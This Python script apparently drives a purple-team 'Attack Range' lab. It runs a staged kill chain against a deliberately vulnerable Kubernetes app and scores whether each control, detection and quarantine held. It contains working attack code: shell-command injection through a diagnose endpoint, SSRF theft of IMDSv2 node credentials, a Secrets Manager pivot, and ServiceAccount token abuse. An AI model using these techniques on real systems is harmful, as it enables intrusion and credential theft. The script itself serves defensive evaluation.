#!/usr/bin/env python3
"""
demo.py — the Attack Range exercise, one stage at a time.

This replaces the old killchain.sh, which ran under `set -euo pipefail`: a single
blocked stage aborted the script and hid whether the later controls held. Here
every stage runs and is judged on its own, so a hardened run shows a verdict for
each control, not just the first one that fired.

Each stage returns one of these statuses, kept distinct on purpose:

  exploited  the planted weakness worked (expected on the baseline)
  blocked    a control stopped it (expected after `make harden`)
  contained  the pod was already quarantined by the deception layer and the
             request never reached it (only with a quarantine record in hand)
  error      the stage could not be evaluated (collection gap, not a control)

An `error` is never rendered as `blocked`: a stage that failed to run is not a
stage that was defended. That includes a stage that was never exercised
because an earlier one held.

Stages 4 and 5 make REAL Kubernetes API calls with the ServiceAccount token
read inside the pod through the stage 1 RCE (ADR-0005). The old method, `kubectl
auth can-i --as=<SA>`, is a SubjectAccessReview under the operator's identity
that the EKS audit log never records, which is why the documented audit queries
matched nothing in evidence/aws-run1. When stage 1 is blocked there is no
foothold, so 4 and 5 read `error` (not exercised). `--assume-breach` keeps the
can-i path, which grants ourselves the adversary's identity and asks what it
may do, so the hardened RBAC still gets a direct verdict.

Stage 6 is the deception layer (ADR-0005): three planted credentials, each
judged on reach, detection (from the alert record in S3, never a synthetic
event) and containment (the responder's quarantine record), with seconds from
first use to alert and to quarantine. Two attacker orders:

  imds-first   the existing chain, then the decoys. The attacker already holds
               the node role, the SA token and the trophy when the alarm rings.
  decoy-first  read and test the planted AWS key first, the move the original
               tip assumes. If the pod is quarantined in time, stages 2 to 5
               run against a contained pod.

Usage:
  APP_URL=http://<lb> IR_BUCKET=<bucket> python3 demo.py --out run.json
  APP_URL=http://<lb> IR_BUCKET=<bucket> python3 demo.py --order decoy-first
  APP_URL=http://<lb> python3 demo.py --assume-breach --no-decoys
  python3 demo.py --compare baseline.json hardened.json  # before/after matrix
"""
from __future__ import annotations

import argparse
import base64
import configparser
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request

NS = "summarizer"
SA = f"system:serviceaccount:{NS}:{NS}"
IMDS = "169.254.169.254"

# Stage 3's actual pivot target: the lab's decoy prod secret, scoped to this
# cluster's name so the node-pivot IAM policy's resource wildcard covers it
# (see infra/node-iam.tf). Override LOOT_SECRET_ID if cluster_name was changed.
LOOT_SECRET_ID = os.environ.get("LOOT_SECRET_ID", "attack-range/prod/db-backup")
AWS_REGION = os.environ.get("AWS_REGION", os.environ.get("AWS_DEFAULT_REGION", "us-east-1"))

# Deception layer (stage 6). IR_BUCKET is terraform output ir_events_bucket.
IR_BUCKET = os.environ.get("IR_BUCKET", "")
DECOY_SECRET = "prod-db-backup-creds"
DETECT_TIMEOUT_S = float(os.environ.get("DETECT_TIMEOUT_S", "600"))
CONTAIN_TIMEOUT_S = float(os.environ.get("CONTAIN_TIMEOUT_S", "120"))
# The alert time comes from Lambda's clock, the use time from this laptop's.
# A record older than the use by more than this is stale, never a detection.
CLOCK_SKEW_S = 5.0

EXPLOITED, BLOCKED, ERROR, INFO = "exploited", "blocked", "error", "info"
CONTAINED = "contained"
DETECTED, MISSED, NOT_CONTAINED, NA = "detected", "missed", "not contained", "n/a"

IMDS_FIRST, DECOY_FIRST = "imds-first", "decoy-first"
DECOYS = ["D1", "D3", "D4"]
DECOY_NAMES = {
    "D1": "AWS key in /root/.aws/credentials",
    "D3": f"Secret {DECOY_SECRET}",
    "D4": "ServiceAccount backup-operator token",
}

# One row per stage: id, name, and the control layer that is meant to stop it.
STAGES = [
    ("0", "Recon", "n/a (discovery)"),
    ("1", "Foothold via RCE", "app (input validation)"),
    ("2", "SSRF to IMDS", "app (fixed upstream) + cloud (IMDS hop limit)"),
    ("3", "Lateral move with node creds", "cloud (scoped node IAM role)"),
    ("4", "Privilege escalation via SA token", "kubernetes (RBAC + automount)"),
    ("5", "Trophy: read the canary Secret", "kubernetes (RBAC) + no secret in env"),
    ("6", "Decoys: take and use planted credentials", "detection (CloudTrail + audit log) + pod quarantine"),
]


# ----------------------------------------------------------------------------
# Pure classification helpers (unit-tested in test_demo.py). No I/O in here.
# ----------------------------------------------------------------------------

def classify_rce(status_code: int | None, stdout: str) -> str:
    """Stage 1. Command output proves RCE; a 400 proves the input was rejected."""
    if status_code is None:
        return ERROR
    if status_code == 400:
        return BLOCKED
    if status_code == 200 and "uid=" in stdout:
        return EXPLOITED
    if status_code == 200:
        # Ran but the injected command did not execute (e.g. arg-vector ping).
        return BLOCKED
    return ERROR


def classify_ssrf(status_code: int | None, body: str) -> str:
    """Stage 2. Reaching IMDS is the exploit; a rejected/ignored URL is blocked."""
    if status_code is None:
        return ERROR
    if status_code == 200 and IMDS in body:
        return EXPLOITED
    if status_code in (400, 422):
        # Hardened app has no url field, or rejects it outright.
        return BLOCKED
    if status_code == 200:
        # Fetched the fixed upstream instead of the caller's URL.
        return BLOCKED
    return ERROR


def classify_can_i(allowed: bool | None) -> str:
    """Stages 4/5. The SA being allowed the action is the exploit."""
    if allowed is None:
        return ERROR
    return EXPLOITED if allowed else BLOCKED


def classify_secret_trophy(can_get: bool | None, secret_exists: bool | None) -> str:
    """Stage 5. Trophy is readable only if the SA may get it AND it still exists."""
    if can_get is None or secret_exists is None:
        return ERROR
    if can_get and secret_exists:
        return EXPLOITED
    return BLOCKED


def classify_lateral(creds_stolen: bool, could_read: bool | None) -> str:
    """Stage 3. Needs stolen node creds; without them the control is not exercised."""
    if not creds_stolen:
        # Upstream (SSRF/hop-limit) held, or the IMDSv2 steal itself failed, so
        # there are no node creds to pivot with. Honestly an error for THIS
        # control: it was not exercised, so we do not claim it as blocked.
        return ERROR
    if could_read is None:
        # Creds were stolen but the pivot attempt itself could not be evaluated
        # (e.g. the aws CLI is missing or timed out). Collection gap, not a verdict.
        return ERROR
    return EXPLOITED if could_read else BLOCKED


def build_matrix(baseline: dict, hardened: dict) -> list[dict]:
    """Join two result sets into before/after rows keyed by stage id."""
    rows = []
    for sid, name, layer in STAGES:
        b = baseline.get(sid, {}).get("status", ERROR)
        h = hardened.get(sid, {}).get("status", ERROR)
        rows.append({"stage": sid, "name": name, "layer": layer,
                     "baseline": b, "hardened": h})
    return rows


def render_matrix(rows: list[dict]) -> str:
    out = ["| Stage | Name | Baseline | Hardened | Control layer |",
           "|---|---|---|---|---|"]
    for r in rows:
        out.append(f"| {r['stage']} | {r['name']} | {r['baseline']} | "
                   f"{r['hardened']} | {r['layer']} |")
    return "\n".join(out)


# ----------------------------------------------------------------------------
# I/O helpers
# ----------------------------------------------------------------------------

def _http(url: str, method: str = "GET", body: bytes | None = None,
          headers: dict | None = None, timeout: int = 10):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310
            return resp.status, resp.read(8192).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:  # noqa: PERF203
        return e.code, e.read(8192).decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return None, ""


def _can_i(verb: str, resource: str, extra: list[str] | None = None) -> bool | None:
    cmd = ["kubectl", "auth", "can-i", verb, resource, "-n", NS, "--as", SA]
    if extra:
        cmd += extra
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    except Exception:  # noqa: BLE001
        return None
    out = r.stdout.strip().lower()
    if out == "yes":
        return True
    if out == "no":
        return False
    return None


def _ssrf_fetch(app_url: str, url: str, method: str = "GET",
                 headers: dict | None = None) -> str | None:
    """Drive the app's SSRF bug (stage 2) to fetch an arbitrary URL server-side.
    Returns the fetched body, or None if the request itself failed (non-200,
    bad JSON, or the hardened app with no url field)."""
    payload = json.dumps({"url": url, "method": method, "headers": headers or {}}).encode()
    code, body = _http(f"{app_url}/summarize", method="POST", body=payload,
                        headers={"content-type": "application/json"})
    if code != 200:
        return None
    try:
        data = json.loads(body)
    except Exception:  # noqa: BLE001
        return None
    return data.get("body")


def _steal_node_credentials(app_url: str) -> dict | None:
    """Stage 3's actual theft: do the full IMDSv2 token dance through the app's
    SSRF bug and come back with the node instance-profile's AccessKeyId,
    SecretAccessKey and Token. Returns None if any hop fails (hardened app has
    no url field, or the IMDSv2-only/hop-limit posture blocks the fetch)."""
    token = _ssrf_fetch(app_url, f"http://{IMDS}/latest/api/token", method="PUT",
                         headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    if not token:
        return None
    token = token.strip()
    role = _ssrf_fetch(app_url, f"http://{IMDS}/latest/meta-data/iam/security-credentials/",
                        headers={"X-aws-ec2-metadata-token": token})
    if not role:
        return None
    role = role.strip().splitlines()[0]
    creds_body = _ssrf_fetch(
        app_url, f"http://{IMDS}/latest/meta-data/iam/security-credentials/{role}",
        headers={"X-aws-ec2-metadata-token": token})
    if not creds_body:
        return None
    try:
        creds = json.loads(creds_body)
    except Exception:  # noqa: BLE001
        return None
    if "AccessKeyId" not in creds or "SecretAccessKey" not in creds:
        return None
    return creds


def _pivot_read_loot(creds: dict) -> bool | None:
    """Use the stolen node creds to attempt the lateral-movement read this
    control is meant to stop: the lab's decoy prod secret, which the summarizer
    app's own identity never had access to. Returns True if read, False if
    denied (the control holds), None if the attempt itself could not be
    evaluated (collection gap, e.g. no aws CLI), never a verdict in that case."""
    env = dict(os.environ)
    env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    if creds.get("Token"):
        env["AWS_SESSION_TOKEN"] = creds["Token"]
    env["AWS_REGION"] = AWS_REGION
    cmd = ["aws", "secretsmanager", "get-secret-value", "--secret-id", LOOT_SECRET_ID,
           "--query", "Name", "--output", "text"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20, env=env)
    except Exception:  # noqa: BLE001
        return None
    if r.returncode == 0:
        return True
    if "AccessDenied" in r.stderr:
        return False
    return None


def _secret_exists() -> bool | None:
    try:
        r = subprocess.run(
            ["kubectl", "-n", NS, "get", "secret", "summarizer-key"],
            capture_output=True, text=True, timeout=20,
        )
    except Exception:  # noqa: BLE001
        return None
    return r.returncode == 0


# ----------------------------------------------------------------------------
# Pure classification for the real-call stages and the deception layer.
# No I/O here; unit-tested in test_demo.py.
# ----------------------------------------------------------------------------

def classify_api_call(rce_ok: bool, result: dict | None, not_found_blocked: bool = False) -> str:
    """Stages 4/5 (real token call) and D3 reach. A call made inside the pod
    with its own mounted token, judged on the API server's HTTP status.

    No foothold means the control was not exercised, which is an error, never a
    `blocked`. `token is False` is the hardened automount fix. not_found_blocked
    lets stage 5 count a deleted trophy (404) as the control holding; a missing
    decoy Secret is a broken deployment, so it stays an error.
    """
    if not rce_ok or result is None:
        return ERROR
    if result.get("token") is False:
        return BLOCKED
    code = result.get("code")
    if code == 200:
        return EXPLOITED
    if code in (401, 403):
        return BLOCKED
    if code == 404 and not_found_blocked:
        return BLOCKED
    return ERROR


def classify_d1_reach(rce_ok: bool, found: bool | None, used: bool | None) -> str:
    """D1 reach. Read the planted credentials file through the RCE, then sign one
    call with the key. GetCallerIdentity needs no permission, so a live key
    always answers; a failure to answer means a broken key, never a control."""
    if not rce_ok or not found or used is None:
        return ERROR
    return EXPLOITED if used else ERROR


def classify_d4_reach(rce_ok: bool, used: bool | None) -> str:
    """D4 reach. The backup-operator token has no RBAC, so any call with it is a
    403. Using it at all is the signal, so a response (even 403) is the reach;
    no foothold or no response is an error."""
    if not rce_ok or used is None:
        return ERROR
    return EXPLOITED if used else ERROR


def seconds_to(event_iso: str, use_epoch: float) -> float | None:
    """Seconds from first decoy use to a record's event time. None if the record
    predates the use beyond clock skew (stale, not caused by this run)."""
    if not event_iso:
        return None
    try:
        t = event_iso.replace("Z", "+00:00")
        rec_epoch = _parse_iso(t)
    except (ValueError, TypeError):
        return None
    delta = rec_epoch - use_epoch
    if delta < -CLOCK_SKEW_S:
        return None
    return max(0.0, round(delta, 1))


def classify_detection(reach: str, record: dict | None, use_epoch: float) -> dict:
    """Did the planted credential's use raise a fresh alert record?

    A record is a detection only if it exists AND its event time is not stale
    with respect to this run's first use. A synthetic event is never a record:
    the alert Lambda writes one only from a real CloudTrail or audit event.
    """
    if reach != EXPLOITED:
        return {"detection": NA, "alert_s": None, "attributed": None}
    if not record:
        return {"detection": MISSED, "alert_s": None, "attributed": None}
    secs = seconds_to(record.get("event_time", ""), use_epoch)
    if secs is None:
        return {"detection": MISSED, "alert_s": None, "attributed": None,
                "note": "record present but stale (predates this run)"}
    attr = (record.get("attribution") or {}).get("method", "none")
    return {"detection": DETECTED, "alert_s": secs, "attributed": attr != "none",
            "attribution": attr}


def classify_containment(detection: str, record: dict | None, use_epoch: float) -> dict:
    """Was the attributed pod quarantined? Only meaningful once detected."""
    if detection != DETECTED:
        return {"containment": NA, "quarantine_s": None, "pods": []}
    if not record or not record.get("quarantined"):
        reason = (record or {}).get("how", "no quarantine record")
        return {"containment": NOT_CONTAINED, "quarantine_s": None, "pods": [], "note": reason}
    secs = seconds_to_epoch(record.get("quarantined_at"), use_epoch)
    return {"containment": CONTAINED, "quarantine_s": secs, "pods": record.get("pods", [])}


def seconds_to_epoch(rec_epoch: float | None, use_epoch: float) -> float | None:
    if rec_epoch is None:
        return None
    return max(0.0, round(rec_epoch - use_epoch, 1))
# ----------------------------------------------------------------------------
# Real-call and deception-layer I/O (exercised live, mocked in tests)
# ----------------------------------------------------------------------------

def _parse_iso(s: str) -> float:
    import datetime as _dt
    return _dt.datetime.fromisoformat(s).timestamp()


def _rce_python(app_url: str, snippet: str) -> str | None:
    """Run one short python3 program in the pod through the stage 1 RCE and
    return its stdout. The base image has python3 but not curl, so the probe is
    written in python, base64-encoded to survive the shell, and piped to it."""
    b64 = base64.b64encode(snippet.encode()).decode()
    cmd = f"echo {b64}|base64 -d|python3"
    host = urllib.parse.quote(f"127.0.0.1;{cmd}", safe="")
    code, body = _http(f"{app_url}/tools/diagnose?host={host}", timeout=20)
    if code != 200:
        return None
    try:
        return json.loads(body).get("stdout", "")
    except Exception:  # noqa: BLE001
        return None


# A probe that reads the pod's own mounted ServiceAccount token and makes one
# HTTPS GET to the API server, printing a single JSON line. It prints only the
# status code and, for a list, the item count, never a secret value.
_POD_API_PROBE = """
import json,os,ssl,urllib.request
d="/var/run/secrets/kubernetes.io/serviceaccount"
try:
    tok=open(d+"/token").read().strip()
except OSError:
    print(json.dumps({{"token":False}}));raise SystemExit
ctx=ssl.create_default_context(cafile=d+"/ca.crt")
r=urllib.request.Request("https://kubernetes.default.svc{path}",
    headers={{"Authorization":"Bearer "+tok}})
try:
    with urllib.request.urlopen(r,context=ctx,timeout=8) as resp:
        n=len((json.loads(resp.read()) or {{}}).get("items",[]))
        print(json.dumps({{"token":True,"code":resp.status,"count":n}}))
except urllib.error.HTTPError as e:
    print(json.dumps({{"token":True,"code":e.code}}))
except Exception as e:
    print(json.dumps({{"token":True,"error":type(e).__name__}}))
"""


def _pod_api_call(app_url: str, path: str) -> dict | None:
    """Stages 4/5 and D3: a real API call with the pod's token. Returns
    {token, code[, count]} or None if the RCE itself did not run."""
    out = _rce_python(app_url, _POD_API_PROBE.format(path=path))
    if not out:
        return None
    try:
        return json.loads(out.strip().splitlines()[-1])
    except Exception:  # noqa: BLE001
        return None


def _read_decoy_key(app_url: str) -> dict | None:
    """D1: read the planted /root/.aws/credentials through the RCE. Returns the
    parsed key, or None if the file is not there (deception layer not applied)."""
    out = _rce_python(app_url, 'print(open("/root/.aws/credentials").read())'
                               ' if __import__("os").path.exists("/root/.aws/credentials") else print("")')
    if not out or "aws_access_key_id" not in out:
        return None
    cp = configparser.ConfigParser()
    try:
        cp.read_string(out)
    except configparser.Error:
        return None
    for sect in cp.sections():
        if cp.has_option(sect, "aws_access_key_id"):
            return {"AccessKeyId": cp.get(sect, "aws_access_key_id"),
                    "SecretAccessKey": cp.get(sect, "aws_secret_access_key", fallback="")}
    return None


def _use_key_get_caller_identity(creds: dict) -> bool | None:
    """Sign one sts:GetCallerIdentity with the key (needs no permission), the
    first thing anyone does with a found key. True if it answered."""
    env = dict(os.environ)
    env["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
    env.pop("AWS_SESSION_TOKEN", None)
    env["AWS_REGION"] = AWS_REGION
    try:
        r = subprocess.run(["aws", "sts", "get-caller-identity", "--output", "json"],
                           capture_output=True, text=True, timeout=20, env=env)
    except Exception:  # noqa: BLE001
        return None
    return r.returncode == 0


# D4: read the backup-operator token out of the secrets list with the stolen
# cluster-admin token, then make one call authenticated as it. The probe prints
# whether a call with that token got any HTTP response.
_D4_PROBE = """
import json,ssl,urllib.request
d="/var/run/secrets/kubernetes.io/serviceaccount"
ctx=ssl.create_default_context(cafile=d+"/ca.crt")
adm=open(d+"/token").read().strip()
def api(path,tok):
    r=urllib.request.Request("https://kubernetes.default.svc"+path,headers={"Authorization":"Bearer "+tok})
    try:
        with urllib.request.urlopen(r,context=ctx,timeout=8) as x:return x.status,x.read()
    except urllib.error.HTTPError as e:return e.code,b""
    except Exception:return None,b""
import base64
c,b=api("/api/v1/namespaces/summarizer/secrets/backup-operator-token",adm)
if c!=200:print(json.dumps({"used":False}));raise SystemExit
tok=base64.b64decode(json.loads(b)["data"]["token"]).decode()
c2,_=api("/api/v1/namespaces/summarizer/secrets",tok)
print(json.dumps({"used":c2 is not None,"code":c2}))
"""


def _use_decoy_sa_token(app_url: str) -> bool | None:
    out = _rce_python(app_url, _D4_PROBE)
    if not out:
        return None
    try:
        return bool(json.loads(out.strip().splitlines()[-1]).get("used"))
    except Exception:  # noqa: BLE001
        return None


def _poll_record(bucket: str, key: str, timeout_s: float) -> dict | None:
    """Wait up to timeout_s for s3://bucket/key to appear, return its JSON. The
    record is written by the alert Lambda or the responder, never by this demo."""
    if not bucket:
        return None
    import boto3
    from botocore.exceptions import ClientError
    s3 = boto3.client("s3")
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            obj = s3.get_object(Bucket=bucket, Key=key)
            return json.loads(obj["Body"].read())
        except ClientError:
            time.sleep(3)
    return None


def _utc_day(epoch: float) -> str:
    import datetime as _dt
    return _dt.datetime.fromtimestamp(epoch, _dt.timezone.utc).strftime("%Y%m%d")
# ----------------------------------------------------------------------------
# Stages (each independent; never raises)
# ----------------------------------------------------------------------------

def run_stages(app_url: str, assume_breach: bool = False) -> dict:
    results: dict[str, dict] = {}

    code, _ = _http(f"{app_url}/healthz")
    results["0"] = {"status": INFO, "detail": f"healthz {code}"}

    code, body = _http(f"{app_url}/tools/diagnose?host=127.0.0.1%3Bid")
    try:
        stdout = json.loads(body).get("stdout", "")
    except Exception:  # noqa: BLE001
        stdout = body
    results["1"] = {"status": classify_rce(code, stdout), "detail": f"HTTP {code}"}
    rce_ok = results["1"]["status"] == EXPLOITED

    payload = json.dumps({"url": f"http://{IMDS}/latest/meta-data/", "method": "GET", "text": "probe"}).encode()
    code, body = _http(f"{app_url}/summarize", method="POST", body=payload,
                       headers={"content-type": "application/json"})
    results["2"] = {"status": classify_ssrf(code, body), "detail": f"HTTP {code}"}
    creds_available = results["2"]["status"] == EXPLOITED

    node_creds = _steal_node_credentials(app_url) if creds_available else None
    could_read = _pivot_read_loot(node_creds) if node_creds else None
    if not creds_available:
        detail = "needs stolen node creds"
    elif node_creds is None:
        detail = "stage 2 won but the IMDSv2 credential steal failed"
    else:
        detail = f"stole node role creds, pivot read of {LOOT_SECRET_ID}: {could_read}"
    results["3"] = {"status": classify_lateral(node_creds is not None, could_read), "detail": detail}

    if assume_breach:
        # The old SubjectAccessReview path: ask what the SA may do, as the
        # operator. A direct RBAC verdict that does not need a foothold, kept so
        # the hardened cluster's RBAC still has a test when stage 1 is blocked.
        allowed = _can_i("list", "secrets", ["--all-namespaces"])
        results["4"] = {"status": classify_can_i(allowed),
                        "detail": f"can-i list secrets -A (assume-breach): {allowed}"}
        can_get = _can_i("get", "secret/summarizer-key")
        exists = _secret_exists()
        results["5"] = {"status": classify_secret_trophy(can_get, exists),
                        "detail": f"can-i get secret: {can_get}, exists: {exists} (assume-breach)"}
        return results

    # Real calls: use the pod's own mounted token through the RCE, so the call
    # is the SA acting, which the EKS audit log records (the documented queries
    # now match). No foothold means not exercised, which reads error.
    r4 = _pod_api_call(app_url, "/api/v1/secrets") if rce_ok else None
    results["4"] = {"status": classify_api_call(rce_ok, r4),
                    "detail": _api_detail(rce_ok, r4)}
    r5 = _pod_api_call(app_url, f"/api/v1/namespaces/{NS}/secrets/summarizer-key") if rce_ok else None
    results["5"] = {"status": classify_api_call(rce_ok, r5, not_found_blocked=True),
                    "detail": _api_detail(rce_ok, r5)}
    return results


def _api_detail(rce_ok: bool, r: dict | None) -> str:
    if not rce_ok:
        return "not exercised: no RCE foothold (stage 1 blocked)"
    if r is None:
        return "RCE ran but the probe returned nothing"
    if r.get("token") is False:
        return "SA token not mounted (automount off)"
    c = r.get("code")
    extra = f", items {r['count']}" if "count" in r else ""
    return f"API {c}{extra}"


# ----------------------------------------------------------------------------
# Stage 6: the deception layer
# ----------------------------------------------------------------------------

def _held_before_alert(stages: dict, order: str) -> list[str]:
    """Which real credentials the attacker already held when the decoy alarm
    fired. The honest answer to 'does a decoy catch them before the real data':
    on the existing chain, everything of value is already taken."""
    if order == DECOY_FIRST:
        return []
    held = []
    if stages.get("3", {}).get("status") == EXPLOITED:
        held.append("node role creds (Secrets Manager read)")
    if stages.get("4", {}).get("status") == EXPLOITED:
        held.append("cluster-admin SA token")
    if stages.get("5", {}).get("status") == EXPLOITED:
        held.append("trophy canary token")
    return held


def _decoy_reach(app_url: str, decoy: str, rce_ok: bool) -> tuple[str, float | None]:
    """Take and use one planted credential. Returns (reach status, use epoch)."""
    if decoy == "D1":
        creds = _read_decoy_key(app_url) if rce_ok else None
        used = _use_key_get_caller_identity(creds) if creds else None
        return classify_d1_reach(rce_ok, creds is not None, used), (time.time() if used else None)
    if decoy == "D3":
        r = _pod_api_call(app_url, f"/api/v1/namespaces/{NS}/secrets/{DECOY_SECRET}") if rce_ok else None
        return classify_api_call(rce_ok, r), (time.time() if (r or {}).get("code") == 200 else None)
    # D4
    used = _use_decoy_sa_token(app_url) if rce_ok else None
    return classify_d4_reach(rce_ok, used), (time.time() if used else None)


def run_stage6(app_url: str, stages: dict, order: str = IMDS_FIRST, bucket: str = IR_BUCKET,
               detect_timeout: float = DETECT_TIMEOUT_S, contain_timeout: float = CONTAIN_TIMEOUT_S) -> dict:
    rce_ok = stages.get("1", {}).get("status") == EXPLOITED
    held = _held_before_alert(stages, order)
    decoys: dict[str, dict] = {}
    for d in DECOYS:
        reach, use_epoch = _decoy_reach(app_url, d, rce_ok)
        entry = {"name": DECOY_NAMES[d], "reach": reach, "held_before_alert": held}
        if reach == EXPLOITED and use_epoch is not None:
            key = f"alerts/{d}/{_utc_day(use_epoch)}.json"
            alert = _poll_record(bucket, key, detect_timeout)
            det = classify_detection(reach, alert, use_epoch)
            entry.update(det)
            if det["detection"] == DETECTED:
                qrec = _poll_record(bucket, f"quarantine/{d}/{_utc_day(use_epoch)}.json", contain_timeout)
                entry.update(classify_containment(DETECTED, qrec, use_epoch))
            else:
                entry.update(classify_containment(det["detection"], None, use_epoch))
        else:
            entry.update(classify_detection(reach, None, use_epoch or 0.0))
            entry.update(classify_containment(NA, None, 0.0))
        decoys[d] = entry
    worst = _stage6_status(decoys)
    return {"status": worst, "order": order, "decoys": decoys}


def _stage6_status(decoys: dict) -> str:
    """One status for the stage row. exploited if any decoy was reachable (the
    baseline story), blocked if none were reachable (hardened, chain stopped
    first), error if a decoy could not be evaluated."""
    reaches = [d["reach"] for d in decoys.values()]
    if any(r == EXPLOITED for r in reaches):
        return EXPLOITED
    if all(r == BLOCKED for r in reaches):
        return BLOCKED
    return ERROR


def render_run(results: dict) -> str:
    out = ["| Stage | Name | Status | Control layer | Detail |", "|---|---|---|---|---|"]
    for sid, name, layer in STAGES:
        r = results.get(sid, {"status": ERROR, "detail": ""})
        out.append(f"| {sid} | {name} | {r['status']} | {layer} | {r.get('detail', '')} |")
    s6 = results.get("6")
    if s6 and "decoys" in s6:
        out += ["", f"### Stage 6 decoys ({s6['order']})", "",
                "| Decoy | Reach | Detected | Alert s | Attributed | Contained | Quarantine s | Held before alert |",
                "|---|---|---|---|---|---|---|---|"]
        for d in DECOYS:
            e = s6["decoys"][d]
            out.append(f"| {d} {e['name']} | {e['reach']} | {e.get('detection', NA)} | "
                       f"{_fmt(e.get('alert_s'))} | {_fmt_attr(e.get('attributed'))} | "
                       f"{e.get('containment', NA)} | {_fmt(e.get('quarantine_s'))} | "
                       f"{'; '.join(e.get('held_before_alert') or []) or 'none'} |")
    return "\n".join(out)


def _fmt(v):
    return "-" if v is None else f"{v}"


def _fmt_attr(v):
    return "-" if v is None else ("yes" if v else "no")
def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out")
    ap.add_argument("--compare", nargs=2, metavar=("BASELINE", "HARDENED"))
    ap.add_argument("--assume-breach", action="store_true",
                    help="evaluate stages 4/5 with kubectl auth can-i instead of a real token call")
    ap.add_argument("--no-decoys", action="store_true", help="skip stage 6 (deception layer)")
    ap.add_argument("--order", choices=[IMDS_FIRST, DECOY_FIRST], default=IMDS_FIRST,
                    help="stage 6 attacker order")
    args = ap.parse_args()

    if args.compare:
        with open(args.compare[0]) as f:
            baseline = json.load(f)
        with open(args.compare[1]) as f:
            hardened = json.load(f)
        print(render_matrix(build_matrix(baseline, hardened)))
        return 0

    app_url = os.environ.get("APP_URL")
    if not app_url:
        print("set APP_URL to the summarizer LoadBalancer URL", file=sys.stderr)
        return 2

    if args.order == DECOY_FIRST and not args.no_decoys:
        # Test the planted key first (the original tip's premise), then run the
        # chain against a possibly-quarantined pod.
        pre = run_stages(app_url, assume_breach=args.assume_breach)
        results = run_stages(app_url, assume_breach=args.assume_breach)
        results["6"] = run_stage6(app_url, pre, order=DECOY_FIRST)
    else:
        results = run_stages(app_url, assume_breach=args.assume_breach)
        if not args.no_decoys:
            results["6"] = run_stage6(app_url, results, order=IMDS_FIRST)

    print(render_run(results))
    if args.out:
        with open(args.out, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nwrote {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
